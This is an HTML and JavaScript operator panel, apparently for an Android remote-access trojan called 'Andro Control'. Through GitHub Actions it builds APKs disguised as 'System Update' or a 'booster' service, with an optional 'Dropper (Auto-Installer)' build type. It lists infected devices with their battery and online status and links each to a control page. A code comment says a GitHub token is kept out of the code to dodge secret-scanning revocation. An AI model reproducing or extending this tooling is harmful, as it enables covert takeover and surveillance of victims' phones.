<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Andro Control — Builder</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Outfit:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
    <noscript><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Outfit:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"></noscript>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="style.css">
    
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('uid') || 'master01';
        const FIREBASE_URL = urlParams.get('firebase_url') || "https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app/";
        
        // Extract project ID from database URL for proper initialization
        const projectId = FIREBASE_URL.replace('https://', '').split('.')[0].split('-default-rtdb')[0];
        if (!firebase.apps.length) {
            firebase.initializeApp({
                databaseURL: FIREBASE_URL,
                projectId: projectId
            });
        }
        const fbDb = firebase.database();
    </script>
</head>
<body>
    <!-- Navbar -->
    <nav class="navbar">
        <div style="max-width: 1400px; margin: 0 auto; width: 100%; padding: 0 24px; display: flex; align-items: center; justify-content: space-between;">
            <a href="index.html" class="navbar-brand">
                <span class="brand-icon"><i class="fas fa-satellite-dish"></i></span>
                ANDRO CONTROL
            </a>
            <div style="display: flex; align-items: center; gap: 8px;">
                <a href="index.html" class="nav-link"><i class="fas fa-hammer me-1"></i> Builder</a>
                <span class="live-badge"><span class="live-dot"></span> SYSTEM ACTIVE</span>
            </div>
        </div>
    </nav>

    <!-- Main Content -->
    <main style="max-width: 1400px; margin: 0 auto; padding: 32px 24px;">
        <div class="fade-in">
            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:32px;flex-wrap:wrap;gap:16px;">
                <div>
                    <h1 style="font-size:1.8rem;margin-bottom:6px;">Command Center</h1>
                    <p style="color:var(--text-secondary);font-size:0.85rem;">Build APKs and monitor connected devices.</p>
                </div>
                <div class="glass-sm" style="padding:10px 18px;display:flex;align-items:center;gap:10px;">
                    <span style="font-size:0.72rem;color:var(--text-muted);">YOUR UID</span>
                    <code id="uidDisplay" style="color:var(--accent);font-size:0.8rem;font-weight:600;">master01</code>
                </div>
            </div>

            <div style="display:grid;grid-template-columns:380px 1fr;gap:24px;align-items:start;">
                <!-- Builder -->
                <div class="card border-top-primary">
                    <div class="card-header-gradient">
                        <h4 style="font-size:1rem;display:flex;align-items:center;gap:10px;">
                            <i class="fas fa-hammer text-primary-c"></i> APK Builder
                        </h4>
                    </div>
                    <div style="padding:24px;">
                        <form id="buildForm">
                            <div style="margin-bottom:14px;"><label class="form-label">App Name</label>
                            <input type="text" name="app_name" class="form-input" placeholder="e.g. System Update" required></div>
                            <div style="margin-bottom:14px;"><label class="form-label">Package Name</label>
                            <input type="text" name="package_name" class="form-input" placeholder="com.system.update" value="com.system.service.booster" required></div>
                            <div style="margin-bottom:14px;" id="webviewContainer"><label class="form-label">Webview URL</label>
                            <input type="url" name="webview_url" id="webviewInput" class="form-input" placeholder="https://..." required></div>
                            <div style="margin-bottom:14px;"><label class="form-label">Build Type</label>
                            <select name="build_type" id="buildTypeSelect" class="form-input" onchange="toggleWebviewField()">
                                <option value="main">Main App (Core Service)</option>
                                <option value="dropper">Dropper App (Auto-Installer)</option>
                            </select></div>
                            <div style="margin-bottom:20px;"><label class="form-label">Custom Icon (PNG)</label>
                            <input type="file" name="app_icon" id="appIconInput" class="form-input" accept=".png" style="padding:8px 12px;"></div>
                            <button type="submit" id="buildBtn" class="btn-primary-glow" style="width:100%;display:flex;align-items:center;justify-content:center;gap:8px;">
                                <i class="fas fa-rocket" id="buildIcon"></i><span id="buildText">BUILD APK</span>
                            </button>
                        </form>
                        <div id="progressArea" style="margin-top:20px;display:none;">
                            <div class="progress-track" style="margin-bottom:10px;"><div id="progressBar" class="progress-fill" style="width:0%;"></div></div>
                            <div id="consoleLog" class="console-box"><div id="logLines"></div></div>
                            <p id="buildStatus" style="font-size:0.72rem;color:var(--text-secondary);text-align:center;margin-top:8px;">Initializing...</p>
                        </div>
                        <div id="downloadArea" style="margin-top:20px;padding:20px;background:rgba(0,184,148,0.08);border:1px dashed rgba(0,184,148,0.3);border-radius:var(--radius-sm);text-align:center;display:none;">
                            <p style="font-size:0.78rem;color:var(--success);font-weight:600;margin-bottom:10px;">✅ BUILD COMPLETE</p>
                            <a href="javascript:void(0)" id="downloadBtn" onclick="downloadApk(this)" class="btn-accent" style="text-decoration:none;cursor:pointer;"><i class="fas fa-download" style="margin-right:6px;"></i>DOWNLOAD APK</a>
                        </div>
                    </div>
                </div>

                <!-- Devices -->
                <div class="card border-top-accent">
                    <div class="card-header-gradient" style="display:flex;justify-content:space-between;align-items:center;">
                        <h4 style="font-size:1rem;display:flex;align-items:center;gap:10px;">
                            <i class="fas fa-mobile-alt text-accent"></i> Connected Devices
                            <span id="deviceCount" class="badge-count">0</span>
                            <span id="onlineCount" style="background:rgba(0,184,148,0.2);color:#00b894;font-size:0.65rem;font-weight:700;padding:2px 8px;border-radius:10px;min-width:20px;text-align:center;">0 online</span>
                        </h4>
                        <button class="btn-ghost" onclick="refreshDevices()" style="padding:6px 14px;"><i class="fas fa-sync-alt"></i></button>
                    </div>
                    <div style="padding:0;" id="deviceContainer">
                        <!-- Skeleton loading for instant perceived speed -->
                        <div id="deviceSkeleton" style="padding:16px;">
                            <div style="display:flex;align-items:center;gap:14px;padding:12px 0;border-bottom:1px solid rgba(255,255,255,0.03);">
                                <div style="width:40px;height:40px;background:var(--bg-elevated);border-radius:10px;animation:skeletonPulse 1.2s infinite;"></div>
                                <div style="flex:1;">
                                    <div style="height:14px;width:120px;background:var(--bg-elevated);border-radius:4px;margin-bottom:6px;animation:skeletonPulse 1.2s infinite;"></div>
                                    <div style="height:10px;width:200px;background:var(--bg-elevated);border-radius:4px;animation:skeletonPulse 1.2s infinite 0.1s;"></div>
                                </div>
                                <div style="height:24px;width:60px;background:var(--bg-elevated);border-radius:12px;animation:skeletonPulse 1.2s infinite 0.2s;"></div>
                            </div>
                            <div style="display:flex;align-items:center;gap:14px;padding:12px 0;">
                                <div style="width:40px;height:40px;background:var(--bg-elevated);border-radius:10px;animation:skeletonPulse 1.2s infinite 0.15s;"></div>
                                <div style="flex:1;">
                                    <div style="height:14px;width:100px;background:var(--bg-elevated);border-radius:4px;margin-bottom:6px;animation:skeletonPulse 1.2s infinite 0.25s;"></div>
                                    <div style="height:10px;width:180px;background:var(--bg-elevated);border-radius:4px;animation:skeletonPulse 1.2s infinite 0.35s;"></div>
                                </div>
                                <div style="height:24px;width:60px;background:var(--bg-elevated);border-radius:12px;animation:skeletonPulse 1.2s infinite 0.4s;"></div>
                            </div>
                        </div>
                        <div id="deviceListArea" style="display:none;">
                            <table class="data-table"><thead><tr><th>Device</th><th>Battery</th><th>Status</th><th style="text-align:right;">Action</th></tr></thead>
                            <tbody id="deviceList"></tbody></table>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <style>
        @keyframes skeletonPulse {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 0.6; }
        }
        .device-row-online {
            border-left: 3px solid #00b894;
            background: rgba(0, 184, 148, 0.03);
        }
        .device-row-online:hover {
            background: rgba(0, 184, 148, 0.06) !important;
        }
        .device-row-offline {
            border-left: 3px solid transparent;
            opacity: 0.6;
        }
        .device-row-offline:hover {
            opacity: 0.85;
        }
        </style>
    </main>

    <script>
    // Update UID in UI header
    document.getElementById('uidDisplay').textContent = userId;

    let deviceCache = {};
    let healthListeners = {};
    let githubToken = '';

    // Load GitHub token from Firebase (not hardcoded to prevent secret scanning revocation)
    fbDb.ref('config/github_token').once('value', snap => {
        githubToken = snap.val() || '';
    });

    // Initial check for existing build status & last_apk from Firebase
    fbDb.ref('panel_users/' + userId).once('value', snap => {
        const udata = snap.val();
        if (udata && udata.last_apk) {
            document.getElementById('downloadBtn').setAttribute('data-apk', udata.last_apk);
            document.getElementById('downloadArea').style.display = 'block';
        }
    });

    // Direct APK download via GitHub API (works with private repos)
    function downloadApk(el) {
        const apkName = el.getAttribute('data-apk');
        if (!apkName || !githubToken) { alert('APK not ready or token missing'); return; }
        el.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:6px;"></i>DOWNLOADING...';
        el.style.pointerEvents = 'none';
        fetch(`https://api.github.com/repos/ggvgghb243-hash/ando-projet/releases/tags/v1.0`, {
            headers: { 'Authorization': 'token ' + githubToken, 'Accept': 'application/vnd.github.v3+json' }
        })
        .then(r => r.json())
        .then(release => {
            const asset = (release.assets || []).find(a => a.name === apkName);
            if (!asset) throw new Error('APK file not found in release');
            return fetch(asset.url, {
                headers: { 'Authorization': 'token ' + githubToken, 'Accept': 'application/octet-stream' }
            });
        })
        .then(r => r.blob())
        .then(blob => {
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url; a.download = apkName; document.body.appendChild(a);
            a.click(); a.remove(); URL.revokeObjectURL(url);
            el.innerHTML = '<i class="fas fa-download" style="margin-right:6px;"></i>DOWNLOAD APK';
            el.style.pointerEvents = 'auto';
        })
        .catch(err => {
            console.error('Download error:', err);
            alert('Download failed: ' + err.message);
            el.innerHTML = '<i class="fas fa-download" style="margin-right:6px;"></i>DOWNLOAD APK';
            el.style.pointerEvents = 'auto';
        });
    }

    function toggleWebviewField() {
        const buildType = document.getElementById('buildTypeSelect').value;
        const container = document.getElementById('webviewContainer');
        const input = document.getElementById('webviewInput');
        
        if (buildType === 'dropper') {
            container.style.display = 'none';
            input.removeAttribute('required');
        } else {
            container.style.display = 'block';
            input.setAttribute('required', 'true');
        }
    }

    document.getElementById('buildForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        const btn = document.getElementById('buildBtn');
        const text = document.getElementById('buildText');
        const icon = document.getElementById('buildIcon');
        
        btn.disabled = true;
        text.textContent = 'STARTING...';
        icon.className = 'fas fa-spinner fa-spin';

        const formData = new FormData(this);
        const appName = formData.get('app_name');
        const packageName = formData.get('package_name');
        const webviewUrl = formData.get('webview_url') || '';
        const buildType = formData.get('build_type');
        const iconFile = document.getElementById('appIconInput').files[0];

        let iconBase64 = '';
        if (iconFile) {
            try {
                iconBase64 = await new Promise((resolve, reject) => {
                    const reader = new FileReader();
                    reader.onload = () => {
                        const res = reader.result;
                        // Strip data url header if present
                        const b64 = res.includes(',') ? res.split(',')[1] : res;
                        resolve(b64);
                    };
                    reader.onerror = reject;
                    reader.readAsDataURL(iconFile);
                });
            } catch(err) {
                console.error('Error reading PNG icon file:', err);
            }
        }

        // Reset progress UI & Firebase status
        document.getElementById('logLines').innerHTML = '';
        document.getElementById('progressBar').style.width = '5%';
        document.getElementById('buildStatus').textContent = 'Triggering GitHub Actions workflow...';
        document.getElementById('progressArea').style.display = 'block';

        fbDb.ref('panel_users/' + userId + '/build_status').set({
            status: '⏳ Starting build...',
            percent: 10,
            last_log: 'Triggering GitHub Actions workflow...'
        });

        // Trigger GitHub Actions workflow dispatch
        fetch('https://api.github.com/repos/ggvgghb243-hash/ando-projet/actions/workflows/build.yml/dispatches', {
            method: 'POST',
            headers: {
                'Authorization': 'token ' + githubToken,
                'Accept': 'application/vnd.github.v3+json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                ref: 'main',
                inputs: {
                    app_name: appName,
                    package_name: packageName,
                    webview_url: webviewUrl,
                    user_id: userId,
                    build_type: buildType,
                    app_icon_b64: iconBase64
                }
            })
        }).then(res => {
            if (res.ok || res.status === 204) {
                console.log('GitHub Actions workflow triggered successfully');
                listenToBuildStatus();
            } else {
                return res.json().then(errData => {
                    throw new Error(errData.message || 'Failed to trigger workflow');
                });
            }
        }).catch(err => {
            console.error('Build trigger error:', err);
            document.getElementById('buildStatus').textContent = '❌ Trigger error: ' + err.message;
            btn.disabled = false;
            text.textContent = 'BUILD APK';
            icon.className = 'fas fa-rocket';
        });
    });

    function listenToBuildStatus() {
        fbDb.ref('panel_users/' + userId + '/build_status').on('value', snap => {
            const v = snap.val();
            if (!v) return;
            
            document.getElementById('progressBar').style.width = (v.percent || 0) + '%';
            document.getElementById('buildStatus').textContent = v.status || '';
            
            if (v.last_log && v.last_log !== window._ll) {
                window._ll = v.last_log;
                const l = document.createElement('div');
                l.className = 'console-line';
                l.textContent = '> ' + v.last_log;
                document.getElementById('logLines').appendChild(l);
                document.getElementById('consoleLog').scrollTop = 999999;
            }
            
            const btn = document.getElementById('buildBtn');
            const text = document.getElementById('buildText');
            const icon = document.getElementById('buildIcon');

            if (v.status === '✅ Complete') {
                text.textContent = 'SUCCESS!';
                icon.className = 'fas fa-check-circle';
                fbDb.ref('panel_users/' + userId).once('value', u => {
                    const ud = u.val();
                    if (ud && ud.last_apk) {
                        document.getElementById('downloadBtn').setAttribute('data-apk', ud.last_apk);
                        document.getElementById('downloadArea').style.display = 'block';
                    }
                });
                setTimeout(() => {
                    btn.disabled = false;
                    text.textContent = 'BUILD APK';
                    icon.className = 'fas fa-rocket';
                    document.getElementById('progressArea').style.display = 'none';
                }, 5000);
            } else if (v.status && (v.status.includes('❌') || v.status.includes('⚠️'))) {
                text.textContent = 'FAILED';
                icon.className = 'fas fa-exclamation-triangle';
                setTimeout(() => {
                    btn.disabled = false;
                    text.textContent = 'BUILD APK';
                    icon.className = 'fas fa-rocket';
                }, 3000);
            }
        });
    }

    function renderDeviceList() {
        const body = document.getElementById('deviceList');
        const skeleton = document.getElementById('deviceSkeleton');
        const listArea = document.getElementById('deviceListArea');
        
        skeleton.style.display = 'none';
        listArea.style.display = 'block';
        
        let devices = Object.values(deviceCache);
        
        if (!devices.length) {
            document.getElementById('deviceCount').textContent = 0;
            document.getElementById('onlineCount').textContent = '0 online';
            body.innerHTML = '<tr><td colspan="4"><div class="empty-state"><i class="fas fa-satellite-dish"></i><p>No devices connected. Install the APK to begin.</p></div></td></tr>';
            return;
        }
        
        // Sort: online first, then by lastSeen
        devices.sort((a, b) => {
            if (a.is_online !== b.is_online) return b.is_online - a.is_online;
            return (b.lastSeen || 0) - (a.lastSeen || 0);
        });
        
        const onlineNum = devices.filter(d => d.is_online).length;
        
        document.getElementById('deviceCount').textContent = devices.length;
        const onlineEl = document.getElementById('onlineCount');
        onlineEl.textContent = onlineNum + ' online';
        onlineEl.style.background = onlineNum > 0 ? 'rgba(0,184,148,0.2)' : 'rgba(255,107,107,0.15)';
        onlineEl.style.color = onlineNum > 0 ? '#00b894' : '#ff6b6b';
        
        let h = '';
        devices.forEach(d => {
            const st = d.is_online ? 'status-online' : 'status-offline';
            const sl = d.is_online ? 'Online' : 'Offline';
            const rowClass = d.is_online ? 'device-row-online' : 'device-row-offline';
            const bi = d.battery < 20 ? 'fa-battery-empty text-danger-c' : d.battery < 50 ? 'fa-battery-quarter text-warning-c' : 'fa-battery-full text-success-c';
            h += `<tr class="${rowClass}"><td><div style="font-weight:600;font-size:0.85rem;">${d.model}</div><div style="font-size:0.68rem;color:var(--text-muted);">${d.did}</div></td><td><i class="fas ${bi}" style="margin-right:4px;"></i>${d.battery}%</td><td><span class="${st}">${sl}</span></td><td style="text-align:right;"><a href="control.html?uid=${userId}&did=${d.did}" class="btn-accent" style="text-decoration:none;padding:7px 18px;font-size:0.75rem;"><i class="fas fa-terminal" style="margin-right:4px;"></i>Control</a></td></tr>`;
        });
        body.innerHTML = h;
    }

    // Direct Firebase health listeners for serverless setup
    function setupRealtimeHealthListeners() {
        fbDb.ref('users/' + userId + '/devices').on('child_added', snap => {
            const did = snap.key;
            if (healthListeners[did]) return;
            
            healthListeners[did] = true;
            
            fbDb.ref('users/' + userId + '/devices/' + did + '/health').on('value', hSnap => {
                const health = hSnap.val() || {};
                const now = Date.now();
                
                let is_online = health.online === true || health.online === 'true' || health.online === 1;
                if (is_online && health.lastSeen) {
                    if ((now - health.lastSeen) > 90000) is_online = false;
                }
                
                if (!deviceCache[did]) {
                    deviceCache[did] = { did: did, model: 'Unknown', battery: 0, is_online: false, lastSeen: 0 };
                }
                deviceCache[did].battery = health.battery || 0;
                deviceCache[did].is_online = is_online;
                deviceCache[did].lastSeen = health.lastSeen || 0;
                renderDeviceList();
            });
            
            fbDb.ref('users/' + userId + '/devices/' + did + '/info').on('value', iSnap => {
                const info = iSnap.val() || {};
                if (!deviceCache[did]) {
                    deviceCache[did] = { did: did, model: 'Unknown', battery: 0, is_online: false, lastSeen: 0 };
                }
                deviceCache[did].model = info.model || info.brand || 'Unknown';
                renderDeviceList();
            });
        });
        
        fbDb.ref('users/' + userId + '/devices').on('child_removed', snap => {
            const did = snap.key;
            delete deviceCache[did];
            delete healthListeners[did];
            renderDeviceList();
        });
    }

    function refreshDevices() {
        document.getElementById('deviceSkeleton').style.display = 'block';
        document.getElementById('deviceListArea').style.display = 'none';
        deviceCache = {};
        renderDeviceList();
    }

    // Start listening immediately
    setupRealtimeHealthListeners();
    // Also listen to build status on initial load in case a build is ongoing
    listenToBuildStatus();
    </script>
</body>
</html>
